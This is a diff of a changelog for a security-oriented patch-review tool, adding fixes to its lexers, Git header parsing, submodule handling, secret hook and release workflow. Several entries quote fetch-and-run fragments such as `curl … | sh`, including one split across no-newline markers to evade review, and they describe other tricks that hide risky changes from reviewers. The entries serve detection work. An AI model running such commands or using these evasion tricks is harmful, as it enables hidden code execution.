@@ -140,21 +140,6 @@ on [Keep a Changelog](https://keepachangelog.com/), and the project follows
   runs bare `review` in a pseudo-terminal (Python's `pty`): the alternate screen and mouse
   capture are entered, the cockpit is drawn, `q` exits 0, and both are restored.
 
-### Fixed
-
-- **A failed alternate-screen entry no longer leaves the terminal in raw mode.** `review` switched
-  raw mode on, then wrote the alternate-screen sequence, and armed its restore guard only after
-  that write; if the write failed (stdout closed) it returned with the terminal still raw. The
-  guard is now armed as soon as raw mode is on. If raw mode cannot be switched on, nothing is
-  written.
-- **`review` on macOS reads keys through a reader that can wait on `/dev/tty`.** The patch is
-  on stdin, so crossterm reads keys from `/dev/tty`, and its default reader registers that fd
-  with kqueue, which refuses it on macOS (crossterm-rs/crossterm#500): `review` would fail on
-  its first key read there. The tui crate enables crossterm's `use-dev-tty` feature on macOS
-  only (select(2) through `filedescriptor`; adds `filedescriptor` 0.8.3 and `thiserror` 1 to
-  the macOS build). Inferred from source, not observed on a Mac: the `macOS tests` job runs
-  `cli/tests/review_tty.rs`, which is the check.
-### Changed
 
 - **The evaluation corpus has 34 cases, and declared misses count.** `fixtures/eval` grew from
   11 to 34 cases (14 ranking, 17 evidence, 3 findings), each with a classified origin: a CVE,
@@ -176,6 +161,138 @@ on [Keep a Changelog](https://keepachangelog.com/), and the project follows
     could never go stale; before, it was a wrong label, exit 7), and when the corpus holds a
     symlink (it could lead out of the corpus). A case can name only a file of the corpus
     directory (exit 3 otherwise).
+
+### Fixed
+
+- **A failed alternate-screen entry no longer leaves the terminal in raw mode.** `review` switched
+  raw mode on, then wrote the alternate-screen sequence, and armed its restore guard only after
+  that write; if the write failed (stdout closed) it returned with the terminal still raw. The
+  guard is now armed as soon as raw mode is on. If raw mode cannot be switched on, nothing is
+  written.
+- **`review` on macOS reads keys through a reader that can wait on `/dev/tty`.** The patch is
+  on stdin, so crossterm reads keys from `/dev/tty`, and its default reader registers that fd
+  with kqueue, which refuses it on macOS (crossterm-rs/crossterm#500): `review` would fail on
+  its first key read there. The tui crate enables crossterm's `use-dev-tty` feature on macOS
+  only (select(2) through `filedescriptor`; adds `filedescriptor` 0.8.3 and `thiserror` 1 to
+  the macOS build). Inferred from source, not observed on a Mac: the `macOS tests` job runs
+  `cli/tests/review_tty.rs`, which is the check.
+
+- **Go raw strings no longer hide the code after them from evidence.** The lexical scanner did
+  not know Go's backtick strings and read their text as code, so a `/*` in a glob
+  (`` filepath.Glob(`/tmp/build/*.o`) ``) opened a block comment that blanked every later line
+  of the hunk, a `//` in a URL ended the line and a `"` opened a phantom string: the
+  `exec.Command` and `http.Get` after them gave no `process_spawn` or `network_fetch`. A
+  backtick now opens a Go string that runs no escapes and is followed across lines.
+- **A `#` inside a quoted YAML scalar or a quoted shell word is no longer a comment.** Any
+  word-start `#` ended a YAML line, so `echo "step #1" && curl … | sh` in a `run: |` block,
+  `run: "echo ' #'; curl …"` and a flow mapping with a `"x #"` key before
+  `pull_request_target` lost their `network_fetch` and `ci_privilege` evidence. YAML quotes are
+  now tracked (a `''` or, in double quotes, a backslash escape; not after a word byte, so
+  `it's` is text), and their contents are still kept as code.
+- **The line that closes a multi-line string keeps its evidence.** Each line began as plain
+  code, so the quote that closes a multi-line string (Rust, a shell string, a JS template, a
+  Python string continued with `\`) opened a phantom string, and the `unsafe`, `curl`, `eval`
+  or `os.system` after it was blanked. A string still open at the end of a line is now carried
+  to the next line of the hunk, which is read both as code and as resuming inside the string;
+  both readings go on down the hunk, and a byte any reading keeps is code.
+- **A quote misread as an opener no longer hides the rest of the hunk.** An unreleased
+  version of the fix above carried only the reading that resumed the string, so an apostrophe
+  in text (`It's`, in a Go hunk that opens inside a raw help string) stayed open from line to
+  line until a real quote "closed" it, and a `/*` in the string after it (a glob) opened a
+  block comment that blanked every later line: the `http.Get` and `exec.Command` below gave no
+  evidence. The same held in JS, Rust and Python. The plain reading, which resumes no string,
+  now always goes on as well (with at most three others), so a line keeps at least what a scan
+  without carried strings keeps.
+- **Rust raw C strings are raw.** `cr"C:\"` and `cr#"…"#` were read as ordinary strings, whose
+  `\"` escapes the closing quote, so the `unsafe` after one on the same line was blanked. The
+  raw-string prefix check now accepts one `b` or `c` before the `r`.
+- **A change to a whitespace-only string literal is no longer called formatting only.** The
+  structural diff dropped every whitespace-only leaf as layout, but tree-sitter has no layout
+  leaves: the leaves dropped were string contents, so `""` to `" "`, or a tab to two spaces,
+  gave `reformat_only: true` in `structural` and in `analyze`'s coverage. A raw string's
+  delimiters are no leaf either, so `f(a)` to `f(r"a")` changed no token. A string literal is
+  now one token of its exact text, as a comment is; a token change inside a literal is reported
+  as the whole literal removed and added.
+- **The long-line linearity test no longer fails on a busy host.** `graph`'s
+  `the_import_rule_is_linear_on_long_lines` bounded its scans by 10 s of wall time; at load 56
+  to 89 a linear scan using 1.8 s of CPU took over 10 s, failed the suite, and turned diff
+  mutation results into false "caught" verdicts. It now bounds the scans' own thread CPU time
+  (Linux `/proc/thread-self/schedstat`, wall time elsewhere) at 15 s, and keeps a 120 s
+  wall-clock deadline only against hangs. Measured: linear code passes under 64 busy loops
+  (20 s wall), and the quadratic import rule it guards against (`eee2b4c^`) still fails at 66.7 s
+  of CPU time. Shrinking the lines was rejected: at 20,000 units the quadratic rule took 0.4 s.
+- **A checked-out submodule's own filter no longer runs during working-tree acquisition.**
+  `--ignore-submodules=none` (the H1-02 fix) made `git diff` run `git status` inside each
+  submodule to see whether it was dirty, and that Git read the submodule's configuration
+  (`.git/modules/<name>/config`, or the submodule's own `.git`) and `.gitattributes` and ran its
+  clean filter: DDF turned off only the superproject's filters, so `--git-working-tree`, the
+  daemon and MCP ran code from a repository someone handed you. Acquisition now passes
+  `--ignore-submodules=dirty`: the commit each submodule records is still compared whatever
+  `diff.ignoreSubmodules` or `.gitmodules` say, and Git never runs inside a submodule. A
+  submodule's uncommitted changes, which the superproject never stores, are no longer marked
+  `-dirty`.
+- **A `\ No newline at end of file` marker must end its side of the file.** The marker drops the
+  newline of the line before it, so Git joins the next line of that side onto it: `+cu`, a
+  marker, `+rl -fsSL https://e.example/x | s`, a marker, `+h` was reviewed as three harmless
+  added lines (rank 2) while `git apply` wrote one `curl … | sh` line (rank 5, `network_fetch`).
+  A later line of a side a marker ended, in the same hunk or a later hunk of the file, now
+  refuses the patch with `InvalidEofMarker` at the marker (exit 4). Git's own forms (a marker
+  after the old side's last line, then the new side's lines) still parse.
+- **CRLF patch headers name the paths Git applies.** The parser split lines on LF only, so a
+  header kept its carriage return: `--- /dev/null\r` was not `/dev/null`, and an added
+  `.github/workflows/ci.yml` was reviewed as `modified .github/workflows/ci.yml\r` (rank 5
+  instead of 8, with its `new_file`, `ci_privilege` and `config_or_lockfile` signals lost); a
+  CRLF mode line was refused as an invalid mode. As `git apply` does, the carriage returns ending
+  a header line (`---`, `+++`, extended headers, hunk headers) are now dropped. Body lines keep
+  theirs (content), and a CR inside a quoted name (`"x\r"`) is still part of the path and still
+  `control`.
+- **Header paths lose their first component, as `git apply -p1` strips it.** Only a literal
+  `a/` or `b/` was stripped, so `--- vendor/build.rs` was reviewed as vendored code (rank 5, no
+  `build_hook`) while Git wrote the top-level `build.rs` (rank 9), a `diff.mnemonicPrefix` diff
+  was reviewed as `w/build.rs`, and `diff -ru old/ new/` output kept `new/`. The first component
+  is now stripped whatever it is (a path with no `/` is kept whole).
+- **`rename old`/`rename new` headers are refused.** `git apply` reads them as `rename from`/
+  `rename to`; DDF ignored them, so the rename was reviewed as `modified <new>` with no sign that
+  the old path is removed. No current Git writes them, so they now refuse the patch with
+  `UnsupportedFormat` (exit 4) rather than being translated. A `diff --git a/x b/y` with no
+  rename header at all is still reviewed as `modified y` (open: the direct two-file comparison
+  depends on it, and the model has no old-path field).
+- **A `diff --git` line is split where both halves name one path, before the ` b/` guess.** The
+  rightmost ` b/` was tried first, so `diff --git a/x b/y b/x b/y` with a mode change was
+  reviewed as `mode_changed y` while `git apply` changed `x b/y`, and the mnemonic
+  `diff --git i/a b/c w/a b/c` as `c` instead of `a b/c`; `i/x "w/x"` got an empty path. The line
+  is now split as `git_header_name` splits it, for any prefixes and a quoted second half, and
+  the rightmost ` b/` is used only when the halves name different files (the mode change of two
+  files compared with `git diff --no-index`).
+- **A file section that names no path is refused.** A `diff --git i/x w/y` (or CRLF `i/x w/x`)
+  mode change with no `---`/`+++` was reviewed as a file with an empty path (exit 0); Git
+  refuses it ("lacks filename information"), as it refuses a hunk with no file headers, which
+  DDF also reviewed with an empty path. Such a section now refuses the patch with `InvalidPath`
+  at its first line (exit 4).
+- **Repeated slashes in a header path are squashed, as Git squashes them.**
+  `--- a/.github//workflows/ci.yml` was reviewed as `.github//workflows/ci.yml` (no
+  `ci_privilege`) while Git wrote `.github/workflows/ci.yml`; the same held for `---`/`+++` in a
+  Git diff and for `rename from`/`rename to`.
+- **A traditional diff keeps the old name when it prefixes the new one.** `--- a/build.rs` with
+  `+++ b/build.rs.new` was reviewed as `modified build.rs.new` (no `build_hook`) while
+  `git apply` changed `build.rs`: without `diff --git`, Git prefers the shorter name when the old
+  name is a strict prefix of an unquoted new one. The parser now chooses as Git does.
+- **An epoch timestamp creates or deletes the file in a traditional diff.**
+  `--- a/new.sh<TAB>1970-01-01 00:00:00.000000000 +0000` (the `diff -N` form) was reviewed as
+  `modified new.sh`, losing `new_file`, while Git created the file; an epoch on the `+++` side
+  deletes the file the `+++` names. The parser now reads the epoch in any zone, as
+  `has_epoch_timestamp` does (not with a fraction other than zero, a CRLF line end, or in a Git
+  diff, where Git does not either).
+- **`-p0` is guessed from the patch, as `git apply` guesses it.** After a traditional diff whose
+  new name has no `/` (`--- x`/`+++ x`), Git keeps every later path whole, so a later
+  `.github/workflows/ci.yml` was reviewed as `workflows/ci.yml`, losing `ci_privilege`. The
+  parser now makes the same guess and holds it for the rest of the patch.
+- **A traditional header name ends where Git's does.** A `diff -u` date after spaces
+  (`--- a/build.rs 2026-01-01 12:00:00`) stayed in the path (`build.rs 2026-01-01 12:00:00`,
+  no `build_hook`), an unquoted CR inside a `---`/`+++` name stayed in it while Git wrote the
+  name before it, and `/dev/null` followed by a space was a path rather than a creation. Names
+  are now read as `find_name_traditional` reads them: a trailing date after a tab or spaces
+  ends the name, otherwise a tab or CR does.
 
 ### Security
 
@@ -213,17 +330,6 @@ on [Keep a Changelog](https://keepachangelog.com/), and the project follows
 - **Pinned actions are enforced.** `cli/tests/workflow_pins.rs` fails when any `uses:` in any
   workflow is not a local path or a full 40-hex commit SHA.
 
-### Fixed
-
-- **The long-line linearity test no longer fails on a busy host.** `graph`'s
-  `the_import_rule_is_linear_on_long_lines` bounded its scans by 10 s of wall time; at load 56
-  to 89 a linear scan using 1.8 s of CPU took over 10 s, failed the suite, and turned diff
-  mutation results into false "caught" verdicts. It now bounds the scans' own thread CPU time
-  (Linux `/proc/thread-self/schedstat`, wall time elsewhere) at 15 s, and keeps a 120 s
-  wall-clock deadline only against hangs. Measured: linear code passes under 64 busy loops
-  (20 s wall), and the quadratic import rule it guards against (`eee2b4c^`) still fails at 66.7 s
-  of CPU time. Shrinking the lines was rejected: at 20,000 units the quadratic rule took 0.4 s.
-
 ### Tests
 
 - **The gate sandbox's surviving mutants are closed** (`review/src/sandbox.rs`): tests pin `--cpus=<host CPUs − 1, min 1>` in argv and receipt, refuse a blank runtime or an empty image by name, and bound control-command output at 64 KiB; one `>=` deadline mutant is argued equivalent (EVIDENCE.md).
@@ -232,6 +338,73 @@ on [Keep a Changelog](https://keepachangelog.com/), and the project follows
   `code_lines_skip_comments_and_attributes_across_lines` already fails, is reported as caught,
   not as a timeout (EVIDENCE.md, "Review crate: mutation_scope mutation").
 - **Council admission boundaries are pinned:** nine `review` contract tests kill the 16 `policy.rs`/`model.rs` mutants that survived the whole-crate run (EVIDENCE.md).
+- **A relative run directory no longer lets the candidate shrink the sealed mutation scope.**
+  `council prepare <request> run` with a `mutation_base` handed Git the snapshot as relative
+  `run/source/<path>` lines on `hash-object --stdin-paths`, and Git runs inside the reviewed
+  repository, so it hashed `<repository>/run/source/<path>` instead of the sealed copy. With
+  nothing there, prepare failed (exit 4, `Git acquisition command failed`); with an ignored copy
+  planted there holding a changed file's base bytes, the file matched its base blob and was left
+  out of `mutation.diff` and its sealed `mutation_diff_sha256` (measured: a changed `y.rs` dropped,
+  and with every changed file planted, an empty diff). `prepare` now names the run absolutely
+  (its canonical parent joined with its name) before anything is written.
+- **`council import-tuicr --execute` no longer writes a journal its own reader refuses.** Appends
+  checked only that the journal length was unchanged, never the 64 MiB cap `load_journal`
+  enforces, so imports of large comments (measured: three 22 MiB ones) took `decisions.jsonl` to
+  69,208,645 bytes, after which every import of the run, dry runs included, was refused until the
+  append-only journal was edited by hand. The planned events are now encoded and refused before
+  anything is written when they would pass the cap, in a dry run as in an execute (exit 4,
+  `tuicr import refused (journal): ... would pass its 67108864-byte cap; nothing was appended`).
+  A journal already over the cap is reported as a journal refusal, not as `tuicr export refused
+  (run): artifact exceeds acquisition budget`.
+
+- **The pre-push secret hook no longer lets a force push over an unfetched remote tip through
+  unscanned.** For an existing branch it scanned `<remote tip>..<local>`; when the remote tip was
+  not in the local clone (a `--force` push after someone else updated the branch), git could not
+  resolve the range, gitleaks 8.30.1 logged the error, reported "0 commits scanned, no leaks
+  found" and exited 0, and a committed token reached the remote (measured). The hook now scans
+  `<local> --not --remotes=<remote>` whenever the remote tip is not a local commit, and refuses
+  the push if `git rev-list` cannot resolve the range, so gitleaks' exit status is never the only
+  signal.
+- **`scripts/diff_mutation.sh` no longer passes untested when a changed Rust file's name has a
+  space or a non-ASCII byte.** It detected Rust changes by matching `+++ b/crates/….rs` header
+  text, but git appends a TAB to a header path with a space and C-quotes one with a non-ASCII
+  byte (`core.quotePath`), so a change touching only such files printed "no Rust changes" and
+  exited 0 in all four required shards (measured). Changed files now come from `git diff
+  --name-only -z`, and the diff handed to cargo mutants is written with `core.quotePath=false`:
+  cargo mutants 27.1.0 refuses a quoted header outright (measured, exit 6).
+- **`scripts/diff_mutation.sh` gives the same answer from any directory.** Its `-- crates/`
+  pathspec resolved against the current directory, so from a subdirectory the diff was empty and
+  the gate passed with no mutants tested (measured). It now runs at the repository root; a
+  relative `DDF_MUTATION_OUT` stays relative to the caller.
+- **The release no longer compiles third-party code while holding write and OIDC tokens.** The
+  `build` matrix held `contents: write`, `attestations: write` and `id-token: write` (on dry runs
+  too) while `cargo build` ran every dependency's build scripts and proc macros, which could have
+  minted an OIDC token for the release workflow's identity (inferred from GitHub's documented
+  OIDC behaviour). `build` is now `contents: read` and keeps its archives as workflow artifacts; a
+  new tag-only `release` job, which checks out and runs no project code, re-verifies the
+  checksums, attests and uploads. `cli/tests/release_workflow.rs` refuses an elevated job that
+  compiles.
+- **A failed release platform no longer leaves a published, partial GitHub Release.** Each
+  matrix leg (`fail-fast: false`) uploaded its own assets to a non-draft release, so the legs
+  that passed published while a failed one only turned the run red (traced, not run). The one
+  upload now happens in the `release` job, which needs every `build` leg; crates.io `publish`
+  now needs `release`.
+- **`scripts/fuzz_target.sh` fuzzes a fresh private corpus.** It reused a fixed
+  `/tmp/ddf-<target>-corpus` with `mkdir -p`, so another local user could pre-create it with
+  symlinks the seed copy wrote through (a planted `basic.patch` link overwrote its target with the
+  fixture, measured), and inputs from earlier runs stayed in the corpus. The corpus is now a new
+  `mktemp -d` directory (mode 0700) removed after the run; crashes stay in `fuzz/artifacts/`.
+  Its root (`DDF_FUZZ_CORPUS_ROOT`, else `RUNNER_TEMP`, else `/tmp`) is still made when missing,
+  as `mkdir -p` did, so a root that does not exist yet does not fail the run (measured).
+- **`scripts/fuzz_target.sh --list` lists every `[[bin]]`, however it is laid out.** A line
+  match took only a `name = "…"` on the line right after `[[bin]]`, so a valid table with `path`
+  first or `name="x"` dropped out of the CI smoke and the weekly campaign while still compiling
+  (measured). The list now comes from Python's `tomllib`.
+- **`just ci` runs on the toolchain CI pins.** `scripts/ci_local.sh` ran every step but the MSRV
+  check on the floating rustup default while `ci.yml` pins 1.99.1, so after a `rustup update` a
+  local PASS could differ from CI (inferred). It now exports `RUSTUP_TOOLCHAIN=1.99.1`, exits 2
+  if that toolchain, rustfmt or clippy is missing, and `ci_replica.rs` fails when its pin and
+  `ci.yml`'s disagree.
 
 ## [0.5.0] - 2026-10-31
 
